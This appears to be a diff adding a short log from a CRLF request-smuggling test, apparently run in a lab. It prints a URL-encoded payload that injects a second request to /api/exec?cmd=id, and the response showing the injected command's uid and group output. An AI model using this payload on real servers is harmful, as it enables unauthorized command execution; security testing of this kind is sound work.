@@ -1,0 +1,5 @@
+attack status: b'HTTP/1.1 200 OK'
+attack body  : b'uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse991'
+repeat body  : b'uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),'
+upstream hits: 1
+    b'GET /x?a%0d%0aGET%20/api/exec%3fcmd=id%20HTTP/1.1%0d%0aHost:%20u%0d%0a%20HTTP/1.1 HTTP/1.1'
